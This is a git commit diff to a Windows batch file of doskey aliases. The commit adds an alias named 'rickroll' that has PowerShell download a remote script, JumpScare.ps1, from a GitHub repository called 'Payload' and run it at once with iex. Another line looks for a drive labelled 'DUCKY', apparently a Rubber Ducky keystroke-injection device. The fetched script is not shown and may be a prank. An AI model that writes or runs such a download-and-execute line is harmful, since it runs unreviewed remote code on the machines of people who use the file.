4f2c5dba4129552e09fcf26c35c8f79d3396b83b
mGv73 <111271925+mGv73@users.noreply.github.com>
2024-11-06 19:48:55 +0100

    Update doskeys.bat

--- doskeys.bat
+++ doskeys.bat
@@ -1,4 +1,5 @@
 doskey ip=ipconfig /all
 doskey restart=shutdown /r /t 0
 doskey sd=shutdown /s /t 0
+doskey rickroll=powershell -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mGv73/Payload/main/JumpScare.ps1')"
 for /f %%I in ('wmic logicaldisk where "VolumeName='DUCKY'" get DeviceID ^| findstr /r /v "^$"') do set driveLetter=%%I
